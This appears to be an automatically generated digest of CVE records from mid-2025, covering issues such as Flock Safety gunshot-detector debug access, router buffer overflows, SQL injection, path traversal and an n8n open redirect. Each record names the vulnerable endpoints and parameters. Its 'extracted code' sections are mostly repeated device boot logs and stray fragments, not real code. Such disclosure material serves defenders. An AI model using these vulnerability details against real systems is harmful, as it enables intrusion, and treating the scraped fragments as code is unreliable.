I (2428) heap_init: At 3FFE0440 len 00003AE0 (14 KiB): D/IRAM
I (2434) heap_init: At 3FFE4350 len 0001BCB0 (111 KiB): D/IRAM
I (2441) heap_init: At 4009F0FC len 00000F04 (3 KiB): IRAM
I (2447) spiram: Adding pool of 4095K of external SPI memory to heap allocator
I (2456) spi_flash: detected chip: generic
I (2459) spi_flash: flash io: dio
I (2475) pm: Frequency switching config: CPU_MAX: 80, APB_MAX: 80, APB_MIN: 40, Light sleep: DISABLED
I (2476) cpu_start: Starting scheduler on PRO CPU.
I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal allocations
W (2504) RTC_STATE: Initializing RTC state on warm boot, with matching CRC
I (2579) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs

Loaded consoleLogEn in from load_from_nvs

================================================================================


CVE ID: CVE-2025-47819
Published: 2025-06-27T02:15:23.757
Modified: 2025-09-02T17:15:34.863
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-1191: CWE-1191

Description:
Flock Safety Gunshot Detection devices before 1.3 have an on-chip debug interface with improper access control.

References (4):
  1. https://gainsec.com/2025/06/19/bird-hunting-season-security-research-on-flock-safety-anti-crime-systems/
  2. https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/
  3. https://gainsec.com/wp-content/uploads/2025/06/flock-safety-researcher-summary.pdf
  4. https://www.flocksafety.com/articles/gunshot-detection-and-license-plate-reader-security-alert

Attempting to extract code examples from references...

--- Code from https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/ ---
I (5306) RAVEN_NDP: chip: NDP120-B0
I (5318) RAVEN_NDP: package version: 1.9.7
I (5321) RAVEN_NDP: firmware version: 76.3.0
I (5323) RAVEN_NDP: parameters version:
I (5325) RAVEN_NDP: number of classes: 3
I (5337) RAVEN_NDP: number of labels: 3
I (5340) RAVEN_NDP: labels:
I (5341) RAVEN_NDP:  NN0:gunshot
I (5343) RAVEN_NDP:  NN0:tire
I (5345) RAVEN_NDP:  NN0:background
I (5359) RAVEN_NDP: syntiant_ndp120_dsp_flow_setup_get succeeded with a value 

I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal alloc                                                                          ations
W (2504) RTC_STATE: Initializing RTC state on CRC mismatch
I (2582) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs
ets Jun  8 2016 00:22:57
rst:0x5 (DEEPSLEEP_RESET),boot:0x13 (SPI_FAST_FLASH_BOOT)
configsip: 0, SPIWP:0xee
clk_drv:0x00,q_drv:0x00,d_drv:0x00,cs0_drv:0x00,hd_drv:0x00,wp_drv:0x00
mode:DIO, clock div:2
load:0x3fff0030,len:5832
load:0x40078000,len:15380
load:0x40080400,len:3672
entry 0x40080674
I (27) boot: ESP-IDF HEAD-HASH-NOTFOUND 2nd stage bootloader
I (27) boot: compile time 01:09:33
I (27) boot: chip revision: 1
I (31) boot_comm: chip revision: 1, min. bootloader chip revision: 0
I (38) boot.esp32: SPI Speed      : 40MHz
I (43) boot.esp32: SPI Mode       : DIO
I (47) boot.esp32: SPI Flash Size : 16MB
I (52) boot: Enabling RNG early entropy source...
I (57) boot: Partition Table:
I (61) boot: ## Label            Usage          Type ST Offset   Length
I (68) boot:  0 nvs              WiFi data        01 02 00009000 00004000
I (76) boot:  1 otadata          OTA data         01 00 0000d000 00002000
I (83) boot:  2 phy_init         RF data          01 01 0000f000 00001000
I (91) boot:  3 ota_0            OTA app          00 10 00010000 00400000
I (98) boot:  4 ota_1            OTA app          00 11 00410000 00400000
I (106) boot:  5 storage          Unknown data     01 81 00810000 00150000
I (113) boot: End of partition table
I (118) boot_comm: chip revision: 1, min. application chip revision: 0
I (125) esp_image: segment 0: paddr=00010020 vaddr=3f400020 size=93260h (602720) map
I (351) esp_image: segment 1: paddr=000a3288 vaddr=3ffbdb60 size=08564h ( 34148) load
I (365) esp_image: segment 2: paddr=000ab7f4 vaddr=40080000 size=04824h ( 18468) load
I (373) esp_image: segment 3: paddr=000b0020 vaddr=400d0020 size=117a18h (1145368) map
I (787) esp_image: segment 4: paddr=001c7a40 vaddr=40084824 size=1a8d8h (108760) load
I (832) esp_image: segment 5: paddr=001e2320 vaddr=400c0000 size=00068h (   104)
I (832) esp_image: segment 6: paddr=001e2390 vaddr=50000000 size=00020h (    32)
I (853) boot: Loaded app from partition at offset 0x10000
I (853) boot: Disabling RNG early entropy source...
I (865) psram: This chip is ESP32-D0WD
I (866) spiram: Found 64MBit SPI RAM device
I (866) spiram: SPI RAM mode: flash 40m sram 40m
I (870) spiram: PSRAM initialized, cache is in low/high (2-core) mode.
I (878) cpu_start: Pro cpu up.
I (881) cpu_start: Starting app cpu, entry point is 0x400812dc
I (0) cpu_start: App cpu up.
I (1751) spiram: SPI SRAM memory test OK
I (2363) cpu_start: Pro cpu start user code
I (2363) cpu_start: cpu freq: 80000000
I (2363) cpu_start: Application information:
I (2366) cpu_start: Project name:     audio_event_detection
I (2372) cpu_start: App version:      fa9a3b8
I (2377) cpu_start: Compile time:     Aug 13 2024 01:09:24
I (2383) cpu_start: ELF file SHA256:  863740b704d3beae...
I (2389) cpu_start: ESP-IDF:          HEAD-HASH-NOTFOUND
I (2396) heap_init: Initializing. RAM available for dynamic allocation:
I (2403) heap_init: At 3FFAFF10 len 000000F0 (0 KiB): DRAM
I (2409) heap_init: At 3FFB6388 len 00001C78 (7 KiB): DRAM
I (2415) heap_init: At 3FFB9A20 len 00004108 (16 KiB): DRAM
I (2421) heap_init: At 3FFCE2C0 len 00011D40 (71 KiB): DRAM
I (2428) heap_init: At 3FFE0440 len 00003AE0 (14 KiB): D/IRAM
I (2434) heap_init: At 3FFE4350 len 0001BCB0 (111 KiB): D/IRAM
I (2441) heap_init: At 4009F0FC len 00000F04 (3 KiB): IRAM
I (2447) spiram: Adding pool of 4095K of external SPI memory to heap allocator
I (2456) spi_flash: detected chip: generic
I (2459) spi_flash: flash io: dio
I (2475) pm: Frequency switching config: CPU_MAX: 80, APB_MAX: 80, APB_MIN: 40, Light sleep: DISABLED
I (2476) cpu_start: Starting scheduler on PRO CPU.
I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal allocations
W (2504) RTC_STATE: Initializing RTC state on warm boot, with matching CRC
I (2579) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs

Loaded consoleLogEn in from load_from_nvs

================================================================================


CVE ID: CVE-2025-47818
Published: 2025-06-27T02:15:23.570
Modified: 2025-09-02T17:15:34.697
CVSS Score: 2.2 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N

CWE Categories:
  - CWE-259: CWE-259

Description:
Flock Safety Gunshot Detection devices before 1.3 have a hard-coded password for a connection.

References (4):
  1. https://gainsec.com/2025/06/19/bird-hunting-season-security-research-on-flock-safety-anti-crime-systems/
  2. https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/
  3. https://gainsec.com/wp-content/uploads/2025/06/flock-safety-researcher-summary.pdf
  4. https://www.flocksafety.com/articles/gunshot-detection-and-license-plate-reader-security-alert

Attempting to extract code examples from references...

--- Code from https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/ ---
I (5306) RAVEN_NDP: chip: NDP120-B0
I (5318) RAVEN_NDP: package version: 1.9.7
I (5321) RAVEN_NDP: firmware version: 76.3.0
I (5323) RAVEN_NDP: parameters version:
I (5325) RAVEN_NDP: number of classes: 3
I (5337) RAVEN_NDP: number of labels: 3
I (5340) RAVEN_NDP: labels:
I (5341) RAVEN_NDP:  NN0:gunshot
I (5343) RAVEN_NDP:  NN0:tire
I (5345) RAVEN_NDP:  NN0:background
I (5359) RAVEN_NDP: syntiant_ndp120_dsp_flow_setup_get succeeded with a value 

I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal alloc                                                                          ations
W (2504) RTC_STATE: Initializing RTC state on CRC mismatch
I (2582) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs
ets Jun  8 2016 00:22:57
rst:0x5 (DEEPSLEEP_RESET),boot:0x13 (SPI_FAST_FLASH_BOOT)
configsip: 0, SPIWP:0xee
clk_drv:0x00,q_drv:0x00,d_drv:0x00,cs0_drv:0x00,hd_drv:0x00,wp_drv:0x00
mode:DIO, clock div:2
load:0x3fff0030,len:5832
load:0x40078000,len:15380
load:0x40080400,len:3672
entry 0x40080674
I (27) boot: ESP-IDF HEAD-HASH-NOTFOUND 2nd stage bootloader
I (27) boot: compile time 01:09:33
I (27) boot: chip revision: 1
I (31) boot_comm: chip revision: 1, min. bootloader chip revision: 0
I (38) boot.esp32: SPI Speed      : 40MHz
I (43) boot.esp32: SPI Mode       : DIO
I (47) boot.esp32: SPI Flash Size : 16MB
I (52) boot: Enabling RNG early entropy source...
I (57) boot: Partition Table:
I (61) boot: ## Label            Usage          Type ST Offset   Length
I (68) boot:  0 nvs              WiFi data        01 02 00009000 00004000
I (76) boot:  1 otadata          OTA data         01 00 0000d000 00002000
I (83) boot:  2 phy_init         RF data          01 01 0000f000 00001000
I (91) boot:  3 ota_0            OTA app          00 10 00010000 00400000
I (98) boot:  4 ota_1            OTA app          00 11 00410000 00400000
I (106) boot:  5 storage          Unknown data     01 81 00810000 00150000
I (113) boot: End of partition table
I (118) boot_comm: chip revision: 1, min. application chip revision: 0
I (125) esp_image: segment 0: paddr=00010020 vaddr=3f400020 size=93260h (602720) map
I (351) esp_image: segment 1: paddr=000a3288 vaddr=3ffbdb60 size=08564h ( 34148) load
I (365) esp_image: segment 2: paddr=000ab7f4 vaddr=40080000 size=04824h ( 18468) load
I (373) esp_image: segment 3: paddr=000b0020 vaddr=400d0020 size=117a18h (1145368) map
I (787) esp_image: segment 4: paddr=001c7a40 vaddr=40084824 size=1a8d8h (108760) load
I (832) esp_image: segment 5: paddr=001e2320 vaddr=400c0000 size=00068h (   104)
I (832) esp_image: segment 6: paddr=001e2390 vaddr=50000000 size=00020h (    32)
I (853) boot: Loaded app from partition at offset 0x10000
I (853) boot: Disabling RNG early entropy source...
I (865) psram: This chip is ESP32-D0WD
I (866) spiram: Found 64MBit SPI RAM device
I (866) spiram: SPI RAM mode: flash 40m sram 40m
I (870) spiram: PSRAM initialized, cache is in low/high (2-core) mode.
I (878) cpu_start: Pro cpu up.
I (881) cpu_start: Starting app cpu, entry point is 0x400812dc
I (0) cpu_start: App cpu up.
I (1751) spiram: SPI SRAM memory test OK
I (2363) cpu_start: Pro cpu start user code
I (2363) cpu_start: cpu freq: 80000000
I (2363) cpu_start: Application information:
I (2366) cpu_start: Project name:     audio_event_detection
I (2372) cpu_start: App version:      fa9a3b8
I (2377) cpu_start: Compile time:     Aug 13 2024 01:09:24
I (2383) cpu_start: ELF file SHA256:  863740b704d3beae...
I (2389) cpu_start: ESP-IDF:          HEAD-HASH-NOTFOUND
I (2396) heap_init: Initializing. RAM available for dynamic allocation:
I (2403) heap_init: At 3FFAFF10 len 000000F0 (0 KiB): DRAM
I (2409) heap_init: At 3FFB6388 len 00001C78 (7 KiB): DRAM
I (2415) heap_init: At 3FFB9A20 len 00004108 (16 KiB): DRAM
I (2421) heap_init: At 3FFCE2C0 len 00011D40 (71 KiB): DRAM
I (2428) heap_init: At 3FFE0440 len 00003AE0 (14 KiB): D/IRAM
I (2434) heap_init: At 3FFE4350 len 0001BCB0 (111 KiB): D/IRAM
I (2441) heap_init: At 4009F0FC len 00000F04 (3 KiB): IRAM
I (2447) spiram: Adding pool of 4095K of external SPI memory to heap allocator
I (2456) spi_flash: detected chip: generic
I (2459) spi_flash: flash io: dio
I (2475) pm: Frequency switching config: CPU_MAX: 80, APB_MAX: 80, APB_MIN: 40, Light sleep: DISABLED
I (2476) cpu_start: Starting scheduler on PRO CPU.
I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal allocations
W (2504) RTC_STATE: Initializing RTC state on warm boot, with matching CRC
I (2579) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs

Loaded consoleLogEn in from load_from_nvs

================================================================================


CVE ID: CVE-2025-6738
Published: 2025-06-27T01:15:23.533
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in huija bicycleSharingServer up to 7b8a3ba48ad618604abd4797d2e7cf3b5ac7625a. Affected by this issue is the function userDao.selectUserByUserNameLike of the file UserServiceImpl.java. The manipulation of the argument Username leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available.

References (4):
  1. https://github.com/huija/bicycleSharingServer/issues/5
  2. https://vuldb.com/?ctiid.314012
  3. https://vuldb.com/?id.314012
  4. https://vuldb.com/?submit.597988

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314012 ---
userDao.selectUserByUserNameLike

userDao.selectUserByUserNameLike

username

================================================================================


CVE ID: CVE-2025-6734
Published: 2025-06-26T23:15:22.743
Modified: 2025-06-30T18:38:48.477
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability was found in UTT HiPER 840G up to 3.1.1-190328. It has been rated as critical. This issue affects the function sub_484E40 of the file /goform/formP2PLimitConfig of the component API. The manipulation of the argument except leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/d2pq/cve/blob/main/616/3.md
  2. https://github.com/d2pq/cve/blob/main/616/3.md#poc
  3. https://vuldb.com/?ctiid.314009
  4. https://vuldb.com/?id.314009
  5. https://vuldb.com/?submit.597679

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314009 ---
sub_484E40

sub_484E40

except

================================================================================


CVE ID: CVE-2025-6733
Published: 2025-06-26T23:15:22.560
Modified: 2025-06-30T18:38:48.477
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability was found in UTT HiPER 840G up to 3.1.1-190328. It has been declared as critical. This vulnerability affects the function sub_416928 of the file /goform/formConfigDnsFilterGlobal of the component API. The manipulation of the argument GroupName leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/d2pq/cve/blob/main/616/2.md
  2. https://github.com/d2pq/cve/blob/main/616/2.md#poc
  3. https://vuldb.com/?ctiid.314008
  4. https://vuldb.com/?id.314008
  5. https://vuldb.com/?submit.597678

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314008 ---
sub_416928

sub_416928

GroupName

================================================================================


CVE ID: CVE-2025-6732
Published: 2025-06-26T22:15:25.267
Modified: 2025-06-30T18:38:48.477
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability was found in UTT HiPER 840G up to 3.1.1-190328. It has been classified as critical. This affects the function strcpy of the file /goform/setSysAdm of the component API. The manipulation of the argument passwd1 leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/d2pq/cve/blob/main/616/1.md
  2. https://github.com/d2pq/cve/blob/main/616/1.md#poc
  3. https://vuldb.com/?ctiid.314007
  4. https://vuldb.com/?id.314007
  5. https://vuldb.com/?submit.597677

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314007 ---
strcpy

strcpy

passwd1

================================================================================


CVE ID: CVE-2025-6731
Published: 2025-06-26T22:15:25.073
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability was found in yzcheng90 X-SpringBoot up to 5.0 and classified as critical. Affected by this issue is the function uploadApk of the file /sys/oss/upload/apk of the component APK File Handler. The manipulation of the argument File leads to path traversal. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (7):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250616-03.md
  2. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250616-03.md#steps-to-reproduce
  3. https://vuldb.com/?ctiid.314006
  4. https://vuldb.com/?id.314006
  5. https://vuldb.com/?submit.597524
  6. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250616-03.md
  7. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250616-03.md#steps-to-reproduce

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314006 ---
uploadApk

uploadApk

file

================================================================================


CVE ID: CVE-2015-0849
Published: 2025-06-26T22:15:24.717
Modified: 2025-08-06T15:48:41.620
CVSS Score: 3.9 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N

CWE Categories:
  - CWE-377: CWE-377

Description:
pycode-browser before version 1.0 is prone to a predictable temporary file vulnerability.

References (1):
  1. https://bugs.debian.org/790365 [Issue Tracking, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://bugs.debian.org/790365 ---
debian-bugs-dist@lists.debian.org, Georges Khaznadar &lt;georgesk@debian.org&gt;

Bug#790365

pycode-browser

================================================================================


CVE ID: CVE-2015-0843
Published: 2025-06-26T22:15:24.613
Modified: 2025-08-06T15:39:51.850
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
yubiserver before 0.6 is prone to buffer overflows due to misuse of sprintf.

References (2):
  1. http://www.include.gr/debian/yubiserver/#changelog [Release Notes]
  2. https://bugs.debian.org/796495 [Issue Tracking, Vendor Advisory, Mailing List]

Attempting to extract code examples from references...

--- Code from http://www.include.gr/debian/yubiserver/#changelog ---
yubiserver

yubiserver

'configure &amp;&amp; make install'

================================================================================


CVE ID: CVE-2015-0842
Published: 2025-06-26T22:15:24.503
Modified: 2025-08-06T15:38:05.563
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
yubiserver before 0.6 is prone to SQL injection issues, potentially leading to an authentication bypass.

References (2):
  1. http://www.include.gr/debian/yubiserver/#changelog [Release Notes]
  2. https://bugs.debian.org/796495 [Issue Tracking, Vendor Advisory, Mailing List]

Attempting to extract code examples from references...

--- Code from http://www.include.gr/debian/yubiserver/#changelog ---
yubiserver

yubiserver

'configure &amp;&amp; make install'

================================================================================


CVE ID: CVE-2014-7210
Published: 2025-06-26T21:15:27.757
Modified: 2025-08-06T16:38:04.910
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-276: Incorrect Default Permissions

Description:
pdns specific as packaged in Debian in version before 3.3.1-1 creates a too privileged MySQL user. It was discovered that the maintainer scripts of pdns-backend-mysql grant too wide database permissions for the pdns user. Other backends
are not affected.

References (2):
  1. https://lists.debian.org/debian-lts-announce/2016/05/msg00046.html [Vendor Advisory, Mailing List]
  2. https://salsa.debian.org/debian/pdns/-/commit/f0de6b3583039bb63344fbd5eb246939264d7b05 [Patch]

Attempting to extract code examples from references...

--- Code from https://lists.debian.org/debian-lts-announce/2016/05/msg00046.html ---
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Package        : pdns
Version        : 3.1-4.1+deb7u1
CVE ID         : CVE-2014-7210

It was discovered that the maintainer scripts of pdns-backend-mysql
grant too wide database permissions for the pdns user. Other backends
are not affected.

For Debian 7 &quot;Wheezy&quot;, these problems have been fixed in version
3.1-4.1+deb7u1.

Note that if you're running the pdns server with the mysql backend these
additional grants are not removed automatically since they might have
been added on purpose. Check

    /usr/share/doc/pdns-backend-mysql/NEWS.Debian.gz

on how to remove them.

We recommend that you upgrade your pdns packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <a  rel="nofollow" href="https://wiki.debian.org/LTS">https://wiki.debian.org/LTS</a>
-----BEGIN PGP SIGNATURE-----

iQIcBAEBCAAGBQJXSyo4AAoJEAe4t7DqmBILRL4QAITBr4V+ukLAXn4T47UgGSEV
kWJMCTPf9eh+katp4Q6PcmRfXvEVFt5jifnbXXO6YAHbp9XNR6W9f32SfdfS1Nmv
Kp9yiw9tX6bZVjpHMICwQuibKkLq5BDo8ZVsZ3GNB+2ayHNAYsXw6MyiN75woOzQ
6s8gzq/0gCqVSqlGDyqo2OME7zgIZsN0qLya2Pvky3gIDgbQ/S2Ais5uPg+FRGP6
NM9fr5C1/PqiMKsm2mJLV+mz1CjTExmolM5jS3T1QCcpKD9+F7pejMS+M9gFCxRp
9ZNePE80MMlp++/1CA+nP6dOx+hDh6MMvMyC8uNgUDqPUZPAwaoo/y4QJLKScK72
rd/i3Fi9YaCapURthjjC/yw+Xx8pWBp5HjrcgfZ1CABCvJe4PLc+jChzndKqZqRH
U9Iqbu2GyWgJofdz7x3QHNzbuIyYYAHtWDticyy6XFqTfvbKZUR1zWOE7C8Jq90u
2KZzg54MfVcHHYP1BBaQQS2LwQnOVAwon7OgdF34peTXZn00ItmGJmQywWJIkM6A
iara1LY4HrNF6dXumKgZzDrqc6PagcDDMmeeq9VA1vE9DA2Y0w73+3C4W1VBhbat
eRXq5H+Bko4nom3B6IcoHI+TV7VD0eISLKGLYuMBIUvq40BLA2Le9/0qWQ+/4itJ
OEZNAEgVuv0Ofs/Ua2uF
=rv7Y
-----END PGP SIGNATURE-----



================================================================================


CVE ID: CVE-2014-6274
Published: 2025-06-26T21:15:27.647
Modified: 2025-08-06T16:36:19.350
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-311: Missing Encryption of Sensitive Data

Description:
git-annex had a bug in the S3 and Glacier remotes where if embedcreds=yes
was set, and the remote used encryption=pubkey or encryption=hybrid,
the embedded AWS credentials were stored in the git repository
in (effectively) plaintext, not encrypted as they were supposed to be. This issue affects git-annex: from 3.20121126 before 5.20140919.

References (1):
  1. https://git-annex.branchable.com/upgrades/insecure_embedded_creds/ [Product]

Attempting to extract code examples from references...

--- Code from https://git-annex.branchable.com/upgrades/insecure_embedded_creds/ ---
git annex
enableremote

AWS_SECRET_ACCESS_KEY

AWS_ACCESS_KEY_ID

================================================================================


CVE ID: CVE-2014-0468
Published: 2025-06-26T21:15:27.527
Modified: 2025-08-06T16:34:59.133
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
Vulnerability in fusionforge in the shipped Apache configuration, where the web server may execute scripts that 
the users would have uploaded in their raw SCM repositories (SVN, Git, 
Bzr...). This issue affects fusionforge: before 5.3+20140506.

References (2):
  1. http://lists.fusionforge.org/pipermail/fusionforge-general/2014-March/002645.html [Broken Link]
  2. https://web.archive.org/web/20151019035734/http://lists.fusionforge.org/pipermail/fusionforge-general/2014-March/002645.html [Vendor Advisory, Mailing List]

Attempting to extract code examples from references...

--- Code from https://web.archive.org/web/20151019035734/http://lists.fusionforge.org/pipermail/fusionforge-general/2014-March/002645.html ---
Hi,

Last week we discovered a vulnerability in the Apache configuration 
shipped with FusionForge, where the web server may execute scripts that 
the users would have uploaded in their raw SCM repositories (SVN, Git, 
Bzr...).

This vulnerability, labelled CVE-2014-0468, can be exploited if you 
provide file-level access (shell access, sftp access) to the /raw/ 
repositories (direct access bypassing the svn/git/etc. commands).
Note: scripts committed normally to the repositories may not be executed 
through this vulnerability.


A fixed configuration is available at:
<a href="https://web.archive.org/web/20151019035734/https://fusionforge.org/plugins/scmgit/cgi-bin/gitweb.cgi?p=fusionforge/fusionforge.git;a=blob;f=src/etc/httpd.conf.d/plugin-generic.inc;hb=HEAD">https://fusionforge.org/plugins/scmgit/cgi-bin/gitweb.cgi?p=fusionforge/fusionforge.git;a=blob;f=src/etc/httpd.conf.d/plugin-generic.inc;hb=HEAD</a>
and reproduced below for reference.

Since the installation process usually does not override configuration 
files (because they may have been customized), make sure you update your 
installed '/etc/&lt;forge&gt;/httpd.conf.d/plugin-generic.inc' file manually.

An updated 5.2 release is in preparation for new installations.
(5.1 reached end of support, but the fix also applies to that version)

Regards,
The FusionForge team.

-----

ScriptAliasMatch ^/plugins/([^/]*)/cgi-bin/(.*) {core/source_path}/plugins/$1/cgi-bin/$2

Alias {core/url_prefix}anonscm/ {core/data_path}/chroot/scmrepos/

&lt;DirectoryMatch {core/data_path}/chroot/scmrepos/[^/]*&gt;
   Options -Indexes
&lt;/DirectoryMatch&gt;
&lt;DirectoryMatch {core/data_path}/chroot/scmrepos/[^/]*/.*&gt;
   # Enable directory index listing, but disable symlinks and CGI
   Options Indexes

   # Permit HTTP Auth for somewhat private projects (mechanism
   # other than the SCM anon bit in the forge)
   AllowOverride AuthConfig

   # Prevent cookie theft in case a script does manage to execute
   RequestHeader unset Cookie

   # Disable all scripting engines (taken from Savannah)
   # except for empty filenames == directory index
   &lt;Files &quot;?*&quot;&gt;
     SetHandler default
   &lt;/Files&gt;

   # Disable PHP5 explicitly for security (CVE-2014-0468)
   &lt;IfModule mod_php5.c&gt;
     php_admin_flag engine off
   &lt;/IfModule&gt;
&lt;/DirectoryMatch&gt;

-------------- section suivante --------------
Une pi?ce jointe HTML a ?t? nettoy?e...
URL: &lt;<a href="https://web.archive.org/web/20151019035734/http://lists.fusionforge.org/pipermail/fusionforge-general/attachments/20140331/432ead16/attachment.html">http://lists.fusionforge.org/pipermail/fusionforge-general/attachments/20140331/432ead16/attachment.html</a>&gt;


================================================================================


CVE ID: CVE-2025-49592
Published: 2025-06-26T20:15:29.323
Modified: 2025-09-02T17:52:02.590
CVSS Score: 4.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N

CWE Categories:
  - CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

Description:
n8n is a workflow automation platform. Versions prior to 1.98.0 have an Open Redirect vulnerability in the login flow. Authenticated users can be redirected to untrusted, attacker-controlled domains after logging in, by crafting malicious URLs with a misleading redirect query parameter. This may lead to phishing attacks by impersonating the n8n UI on lookalike domains (e.g., n8n.local.evil.com), credential or 2FA theft if users are tricked into re-entering sensitive information, and/or reputation risk due to the visual similarity between attacker-controlled domains and trusted ones. The vulnerability affects anyone hosting n8n and exposing the `/signin` endpoint to users. The issue has been patched in version 1.98.0. All users should upgrade to this version or later. The fix introduces strict origin validation for redirect URLs, ensuring only same-origin or relative paths are allowed after login.

References (4):
  1. https://github.com/n8n-io/n8n/commit/4865d1e360a0fe7b045e295b5e1a29daad12314e [Patch]
  2. https://github.com/n8n-io/n8n/pull/16034 [Patch]
  3. https://github.com/n8n-io/n8n/releases/tag/n8n%401.98.0 [Release Notes]
  4. https://github.com/n8n-io/n8n/security/advisories/GHSA-5vj6-wjr7-5v9f [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/n8n-io/n8n/commit/4865d1e360a0fe7b045e295b5e1a29daad12314e ---
From 4865d1e360a0fe7b045e295b5e1a29daad12314e Mon Sep 17 00:00:00 2001
From: Marc Littlemore <MarcL@users.noreply.github.com>
Date: Thu, 5 Jun 2025 08:31:55 +0100
Subject: [PATCH] fix(editor): Stop nefarious redirects during sign in (#16034)

---
 .../editor-ui/src/views/SigninView.test.ts    | 126 +++++++++++++++---
 .../editor-ui/src/views/SigninView.vue        |  14 +-
 2 files changed, 123 insertions(+), 17 deletions(-)

diff --git a/packages/frontend/editor-ui/src/views/SigninView.test.ts b/packages/frontend/editor-ui/src/views/SigninView.test.ts
